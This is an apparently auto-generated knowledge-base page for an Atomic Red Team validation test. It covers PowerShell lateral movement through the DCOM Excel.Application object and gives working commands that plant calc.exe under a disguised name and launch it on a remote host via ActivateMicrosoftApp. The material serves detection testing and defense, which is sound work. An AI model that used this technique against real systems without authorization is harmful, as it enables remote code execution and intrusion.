---
atomic_guid: "505f24be-1c11-4694-b614-e01ae1cd2570"
title: "PowerShell Lateral Movement Using Excel Application Object"
framework: "atomic"
generated: "true"
attack_technique_id: "T1021.003"
attack_technique_name: "Remote Services: Distributed Component Object Model"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.003/T1021.003.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "505f24be-1c11-4694-b614-e01ae1cd2570"
  - "PowerShell Lateral Movement Using Excel Application Object"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# PowerShell Lateral Movement Using Excel Application Object

Powershell lateral movement using the Excel COM objects.

Reference:

https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922

Upon successful execution, cmd will spawn calc.exe on a remote computer.

## Metadata

- Atomic GUID: 505f24be-1c11-4694-b614-e01ae1cd2570
- Technique: T1021.003: Remote Services: Distributed Component Object Model
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1021.003/T1021.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1021-remote_services|T1021.003]]

## Input Arguments

### computer_name

- description: Hostname or IP
- type: string
- default: localhost

### user

- description: Name of user
- type: string
- default: admin

## Dependencies

Microsoft Excel must be installed

### Prerequisite Check

```text
try {
  New-Object -COMObject "Excel.Application" | Out-Null
  Stop-Process -Name "Excel"
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```text
Write-Host "You will need to install Microsoft Excel manually to meet this requirement"
```

## Executor

- name: powershell

### Command

```powershell
copy c:\windows\system32\calc.exe 'C:\users\#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe'
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","#{computer_name}"))
$com.ActivateMicrosoftApp("5")
```

### Cleanup

```powershell
Remove-Item 'C:\users\#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe'
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.003/T1021.003.yaml)
